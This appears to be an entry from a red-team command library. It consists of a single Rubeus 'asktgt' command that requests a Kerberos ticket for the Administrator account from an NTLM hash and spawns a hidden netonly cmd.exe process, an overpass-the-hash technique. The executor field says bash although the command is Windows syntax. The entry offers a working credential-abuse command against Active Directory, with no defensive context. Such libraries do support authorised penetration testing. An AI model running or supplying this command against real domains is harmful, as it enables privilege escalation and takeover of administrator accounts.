---
id: cfdb78a2-42b6-4e3e-8f2b-2df04ad55438
name: Pass Ticket to sacrificial hidden process
type: command
executor: bash
data: .\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /createnetonly:C:\Windows\System32\cmd.exe
output: null
created_at: '2023-04-06T03:56:05.155235+00:00'
updated_at: '2023-04-10T20:26:24.177808+00:00'
---

# Pass Ticket to sacrificial hidden process

```bash
.\Rubeus.exe asktgt /user:Administrator /rc4:[NTLMHASH] /createnetonly:C:\Windows\System32\cmd.exe
```


